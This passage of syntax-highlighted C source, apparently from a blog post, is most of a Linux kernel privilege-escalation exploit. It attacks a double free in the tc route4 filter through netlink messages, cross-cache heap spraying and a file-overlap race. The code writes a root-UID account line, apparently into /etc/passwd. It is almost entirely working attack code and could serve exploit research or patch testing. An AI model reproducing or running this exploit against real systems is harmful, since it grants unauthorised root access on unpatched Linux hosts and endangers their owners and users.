class="line">        <span class="keyword">char</span> *current;</span><br><span class="line">        <span class="built_in">memset</span>(data, <span class="number">0</span>, <span class="number">0x3000</span>);</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">tcf_ematch_hdr</span> *<span class="title">hdr</span> =</span> (struct tcf_ematch_hdr *)data;</span><br><span class="line">        hdr-&gt;kind = TCF_EM_META;</span><br><span class="line">        hdr-&gt;flags = TCF_EM_REL_AND;</span><br><span class="line"></span><br><span class="line">        current = data + <span class="keyword">sizeof</span>(*hdr);</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">tcf_meta_hdr</span> <span class="title">meta_hdr</span> =</span> &#123;</span><br><span class="line">            .left.kind = TCF_META_TYPE_VAR &lt;&lt; <span class="number">12</span> | TCF_META_ID_DEV,</span><br><span class="line">            .right.kind = TCF_META_TYPE_VAR &lt;&lt; <span class="number">12</span> | TCF_META_ID_DEV,</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        current += addattr(current, TCA_EM_META_HDR, &amp;meta_hdr, <span class="keyword">sizeof</span>(hdr));</span><br><span class="line">        current += addattr(current, TCA_EM_META_LVALUE, spray_data, spray_len);</span><br><span class="line">        current += addattr(current, TCA_EM_META_RVALUE, spray_data, spray_len);</span><br><span class="line"></span><br><span class="line">        addattr_l(msg, <span class="number">0x4000</span>, i + <span class="number">1</span>, data, current - data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    addattr_nest_end(msg, rt_match_tail);</span><br><span class="line">    addattr_nest_end(msg, ema_tail);</span><br><span class="line">    addattr_nest_end(msg, tail);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// packing</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span> =</span> &#123;.iov_base = msg, .iov_len = msg-&gt;nlmsg_len&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_nl</span> <span class="title">nladdr</span> =</span> &#123;.nl_family = AF_NETLINK&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msgh</span> =</span> &#123;</span><br><span class="line">        .msg_name = &amp;nladdr,</span><br><span class="line">        .msg_namelen = <span class="keyword">sizeof</span>(nladdr),</span><br><span class="line">        .msg_iov = &amp;iov,</span><br><span class="line">        .msg_iovlen = <span class="number">1</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    sendmsg(fd, &amp;msgh, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">free</span>(data);</span><br><span class="line">    <span class="built_in">free</span>(start);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">delete_tc_basic</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">u_int32_t</span> handle)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *start = <span class="built_in">malloc</span>(<span class="number">0x4000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(start, <span class="number">0</span>, <span class="number">0x4000</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> *<span class="title">msg</span> =</span> (struct nlmsghdr *)start;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// new filter</span></span><br><span class="line">    msg = msg + msg-&gt;nlmsg_len;</span><br><span class="line">    msg-&gt;nlmsg_len = NLMSG_LENGTH(<span class="keyword">sizeof</span>(struct tcmsg));</span><br><span class="line">    msg-&gt;nlmsg_flags = NLM_F_REQUEST | NLM_F_ECHO;</span><br><span class="line">    msg-&gt;nlmsg_type = RTM_DELTFILTER;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcmsg</span> *<span class="title">t</span> =</span> (struct tcmsg *)(start + <span class="keyword">sizeof</span>(struct nlmsghdr));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prio, protocol</span></span><br><span class="line">    <span class="keyword">u_int32_t</span> prio = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">u_int32_t</span> protocol = <span class="number">1</span>;</span><br><span class="line">    t-&gt;tcm_info = TC_H_MAKE(prio &lt;&lt; <span class="number">16</span>, protocol);</span><br><span class="line">    t-&gt;tcm_ifindex = <span class="number">1</span>;</span><br><span class="line">    t-&gt;tcm_family = AF_UNSPEC;</span><br><span class="line">    t-&gt;tcm_handle = handle;</span><br><span class="line">    <span class="comment">// t-&gt;tcm_parent = TC_H_ROOT;</span></span><br><span class="line"></span><br><span class="line">    addattr_l(msg, <span class="number">0x1000</span>, TCA_KIND, <span class="string">&quot;basic&quot;</span>, <span class="number">6</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtattr</span> *<span class="title">tail</span> =</span> addattr_nest(msg, <span class="number">0x1000</span>, TCA_OPTIONS);</span><br><span class="line">    addattr_nest_end(msg, tail);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// packing</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span> =</span> &#123;.iov_base = msg, .iov_len = msg-&gt;nlmsg_len&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_nl</span> <span class="title">nladdr</span> =</span> &#123;.nl_family = AF_NETLINK&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msgh</span> =</span> &#123;</span><br><span class="line">        .msg_name = &amp;nladdr,</span><br><span class="line">        .msg_namelen = <span class="keyword">sizeof</span>(nladdr),</span><br><span class="line">        .msg_iov = &amp;iov,</span><br><span class="line">        .msg_iovlen = <span class="number">1</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    sendmsg(sockfd, &amp;msgh, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memset</span>(start, <span class="number">0</span>, <span class="number">0x4000</span>);</span><br><span class="line">    iov.iov_len = <span class="number">0x4000</span>;</span><br><span class="line">    iov.iov_base = start;</span><br><span class="line">    recvmsg(sockfd, &amp;msgh, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (msgh.msg_namelen != <span class="keyword">sizeof</span>(nladdr))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;size of sender address is wrong\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> start;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">slow_write</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;start slow write\n&quot;</span>);</span><br><span class="line">    <span class="keyword">clock_t</span> start, end;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;./uaf&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;error open uaf file&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> addr = <span class="number">0x30000000</span>;</span><br><span class="line">    <span class="keyword">int</span> offset;</span><br><span class="line">    <span class="keyword">for</span> (offset = <span class="number">0</span>; offset &lt; <span class="number">0x80000</span> / <span class="number">20</span>; offset++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">void</span> *r = mmap((<span class="keyword">void</span> *)(addr + offset * <span class="number">0x1000</span>), <span class="number">0x1000</span>,</span><br><span class="line">                       PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (r &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;allocate failed at 0x%x\n&quot;</span>, offset);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    assert(offset &gt; <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> *mem = (<span class="keyword">void</span> *)(addr);</span><br><span class="line">    <span class="built_in">memcpy</span>(mem, <span class="string">&quot;hhhhh&quot;</span>, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span>[20];</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        iov[i].iov_base = mem;</span><br><span class="line">        iov[i].iov_len = offset * <span class="number">0x1000</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    run_write = <span class="number">1</span>;</span><br><span class="line">    start = clock();</span><br><span class="line">    <span class="comment">// 2GB max</span></span><br><span class="line">    <span class="keyword">if</span> (writev(fd, iov, <span class="number">20</span>) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;slow write&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    end = clock();</span><br><span class="line">    <span class="keyword">double</span> spent = (<span class="keyword">double</span>)(end - start) / CLOCKS_PER_SEC;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;write done, spent %f s\n&quot;</span>, spent);</span><br><span class="line">    run_write = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">write_cmd</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// user:$1$user$k8sntSoh7jhsc6lwspjsU.:0:0:/root/root:/bin/bash</span></span><br><span class="line">    <span class="keyword">char</span> data[<span class="number">1024</span>] =</span><br><span class="line">        <span class="string">&quot;user:$1$user$k8sntSoh7jhsc6lwspjsU.:0:0:/root/root:/bin/bash&quot;</span>;</span><br><span class="line">    <span class="comment">// struct iovec iov = &#123;.iov_base = data, .iov_len = strlen(data)&#125;;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span> =</span> &#123;.iov_base = content, .iov_len = <span class="built_in">strlen</span>(content)&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!run_write)</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    run_spray = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (writev(overlap_a, &amp;iov, <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;failed to write\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;should be after the slow write\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pre_exploit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    adjust_rlimit();</span><br><span class="line">    use_temporary_dir();</span><br><span class="line">    setup_namespace();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">exploit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">2</span> * PAGE_SIZE] = &#123;&#125;;</span><br><span class="line">    <span class="keyword">char</span> msg[<span class="number">0x10</span>] = &#123;&#125;;</span><br><span class="line">    <span class="keyword">char</span> *spray;</span><br><span class="line">    <span class="keyword">int</span> cc;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rlimit</span> <span class="title">old_lim</span>, <span class="title">lim</span>, <span class="title">new_lim</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get old limits</span></span><br><span class="line">    <span class="keyword">if</span> (getrlimit(RLIMIT_NOFILE, &amp;old_lim) == <span class="number">0</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Old limits -&gt; soft limit= %ld \t&quot;</span></span><br><span class="line">               <span class="string">&quot; hard limit= %ld \n&quot;</span>,</span><br><span class="line">               old_lim.rlim_cur, old_lim.rlim_max);</span><br><span class="line">    pin_on_cpu(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;starting exploit, num of cores: %d\n&quot;</span>, cpu_cores);</span><br><span class="line"></span><br><span class="line">    sockfd = socket(PF_NETLINK, SOCK_RAW, <span class="number">0</span>);</span><br><span class="line">    assert(sockfd != <span class="number">-1</span>);</span><br><span class="line">    add_qdisc(sockfd);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// wait for parent</span></span><br><span class="line">    <span class="keyword">if</span> (read(pipe_child[<span class="number">0</span>], msg, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;read from parent&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// allocate the vulnerable object</span></span><br><span class="line">    add_tc_(sockfd, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, NLM_F_EXCL | NLM_F_CREATE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ask parent to keep spraying</span></span><br><span class="line">    <span class="keyword">if</span> (write(pipe_parent[<span class="number">1</span>], <span class="string">&quot;OK&quot;</span>, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;write to child&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (read(pipe_child[<span class="number">0</span>], msg, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;read from parent&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// free the object, to free the slab</span></span><br><span class="line">    add_tc_(sockfd, <span class="number">0x11</span>, <span class="number">0x12</span>, <span class="number">0</span>, NLM_F_CREATE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// wait for the vulnerable object being freed</span></span><br><span class="line">    usleep(<span class="number">500</span> * <span class="number">1000</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;freed the filter object\n&quot;</span>);</span><br><span class="line">    <span class="comment">// sync</span></span><br><span class="line">    <span class="keyword">if</span> (write(pipe_parent[<span class="number">1</span>], <span class="string">&quot;OK&quot;</span>, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;write to child&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (read(pipe_child[<span class="number">0</span>], msg, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;read from parent&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    usleep(<span class="number">1000</span> * <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; spray_num_1; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        pin_on_cpu(i % cpu_cores);</span><br><span class="line">        fds[i] = open(<span class="string">&quot;./data2&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        assert(fds[i] &gt; <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// double free route4, which will free the file</span></span><br><span class="line">    add_tc_(sockfd, <span class="number">0x11</span>, <span class="number">0x13</span>, <span class="number">0</span>, NLM_F_CREATE);</span><br><span class="line">    usleep(<span class="number">1000</span> * <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// should not sleep too long, otherwise file might be claimed by others</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;double free done\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;spraying files\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// the following is to figure out which file is freed</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; spray_num_2; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        pin_on_cpu(i % cpu_cores);</span><br><span class="line">        fd_2[i] = open(<span class="string">&quot;./uaf&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        assert(fd_2[i] &gt; <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; spray_num_1; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (syscall(__NR_kcmp, getpid(), getpid(), KCMP_FILE, fds[j], fd_2[i]) ==</span><br><span class="line">                <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;found overlap, id : %d, %d\n&quot;</span>, i, j);</span><br><span class="line">                overlap_a = fds[j];</span><br><span class="line">                overlap_b = fd_2[i];</span><br><span class="line"></span><br><span class="line">                <span class="keyword">pthread_t</span> pid, pid2;</span><br><span class="line">                pthread_create(&amp;pid, <span class="literal">NULL</span>, slow_write, <span class="literal">NULL</span>);</span><br><span class="line">                pthread_create(&amp;pid2, <span class="literal">NULL</span>, write_cmd, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span> (!run_spray)</span><br><span class="line">                &#123;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                close(overlap_a);</span><br><span class="line">                close(overlap_b);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;closed overlap\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">                usleep(<span class="number">1000</span> * <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">int</span> spray_num = <span class="number">4096</span>;</span><br><span class="line">                write(pipe_file_spray[<span class="number">0</span>][<span class="number">1</span>], &amp;spray_num, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">                <span class="keyword">if</span> (read(pipe_file_spray[<span class="number">1</span>][<span class="number">0</span>], &amp;msg, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    err(<span class="number">1</span>, <span class="string">&quot;read from file spray&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                overlapped = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (overlapped)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">while</span> (run_write)</span><br><span class="line">    &#123;</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!overlapped)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;no overlap found :(...\n&quot;</span>);</span><br><span class="line">        write(pipe_main[<span class="number">1</span>], <span class="string">&quot;\xff&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> xx = open(target, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">char</span> buf[<span class="number">0x100</span>] = &#123;&#125;;</span><br><span class="line">        <span class="comment">// check if user in the passwd</span></span><br><span class="line">        read(xx, buf, <span class="number">0x30</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(buf, <span class="string">&quot;user&quot;</span>, <span class="number">4</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            write(pipe_main[<span class="number">1</span>], <span class="string">&quot;\x00&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;not successful : %s\n&quot;</span>, buf);</span><br><span class="line">            write(pipe_main[<span class="number">1</span>], <span class="string">&quot;\xff&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        sleep(<span class="number">1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">post_exploit</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// this poc assume we have a heap address leaked</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">run_exp</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (pipe(pipe_parent) == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;fail to create pipes\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pipe(pipe_child) == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;fail to create pipes\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pipe(pipe_defrag) == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;fail to create pipes\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pipe(pipe_file_spray[<span class="number">0</span>]) == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;fail to create pipes\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pipe(pipe_file_spray[<span class="number">1</span>]) == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;fail to create pipes\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cpu_cores = sysconf(_SC_NPROCESSORS_ONLN);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fork() == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// thread for spraying file we want to overwrite</span></span><br><span class="line">        adjust_rlimit();</span><br><span class="line">        <span class="keyword">int</span> spray_num = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (read(pipe_file_spray[<span class="number">0</span>][<span class="number">0</span>], &amp;spray_num, <span class="keyword">sizeof</span>(<span class="keyword">int</span>)) &lt; <span class="keyword">sizeof</span>(<span class="keyword">int</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            err(<span class="number">1</span>, <span class="string">&quot;read file spray&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;got cmd, start spraying %s\n&quot;</span>, target);</span><br><span class="line">        spray_num = <span class="number">4096</span>;</span><br><span class="line">        <span class="keyword">if</span> (fork() == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; spray_num; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                pin_on_cpu(i % cpu_cores);</span><br><span class="line">                open(target, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                sleep(<span class="number">10000</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; spray_num; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            pin_on_cpu(i % cpu_cores);</span><br><span class="line">            open(target, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;spray done\n&quot;</span>);</span><br><span class="line">        write(pipe_file_spray[<span class="number">1</span>][<span class="number">1</span>], <span class="string">&quot;OK&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            sleep(<span class="number">10000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fork() == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        pin_on_cpu(<span class="number">0</span>);</span><br><span class="line">        pre_exploit();</span><br><span class="line">        exploit();</span><br><span class="line">        post_exploit();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        sleep(<span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span> (fork() == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// do the defragmentation to exhaust all file slabs</span></span><br><span class="line">            <span class="comment">// for cross cache</span></span><br><span class="line">            adjust_rlimit();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                pin_on_cpu(i % cpu_cores);</span><br><span class="line">                open(target, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;defrag done\n&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (write(pipe_defrag[<span class="number">1</span>], <span class="string">&quot;OK&quot;</span>, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                err(<span class="number">1</span>, <span class="string">&quot;failed write defrag&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                sleep(<span class="number">1000</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// memory spray thread</span></span><br><span class="line">            setup_namespace();</span><br><span class="line">            pin_on_cpu(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">int</span> sprayfd = socket(PF_NETLINK, SOCK_RAW, <span class="number">0</span>);</span><br><span class="line">            assert(sprayfd != <span class="number">-1</span>);</span><br><span class="line">            add_qdisc(sprayfd);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">char</span> msg[<span class="number">0x10</span>] = &#123;&#125;;</span><br><span class="line">            <span class="keyword">char</span> payload[<span class="number">256</span>] = &#123;&#125;;</span><br><span class="line">            <span class="built_in">memset</span>(payload + <span class="number">0x10</span>, <span class="string">&#x27;A&#x27;</span>, <span class="number">256</span> - <span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (read(pipe_defrag[<span class="number">0</span>], msg, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                err(<span class="number">1</span>, <span class="string">&quot;failed read defrag&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// if the exploit keeps failing, please tune the middle and end</span></span><br><span class="line">            <span class="keyword">int</span> middle = <span class="number">38</span>;</span><br><span class="line">            <span class="keyword">int</span> end = middle + <span class="number">40</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// preparing for cross cache</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; middle; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                add_tc_basic(sprayfd, i + <span class="number">1</span>, payload, <span class="number">193</span>, <span class="number">32</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            add_tc_basic(sprayfd, middle + <span class="number">1</span>, payload, <span class="number">193</span>, <span class="number">32</span>);</span><br><span class="line">            add_tc_basic(sprayfd, middle + <span class="number">2</span>, payload, <span class="number">193</span>, <span class="number">32</span>);</span><br><span class="line">            add_tc_basic(sprayfd, middle + <span class="number">3</span>, payload, <span class="number">193</span>, <span class="number">32</span>);</span><br><span class="line">            <span class="keyword">if</span> (write(pipe_child[<span class="number">1</span>], <span class="string">&quot;OK&quot;</span>, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                err(<span class="number">1</span>, <span class="string">&quot;write to parent\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// allocate route4</span></span><br><span class="line">            <span class="keyword">if</span> (read(pipe_parent[<span class="number">0</span>], msg, 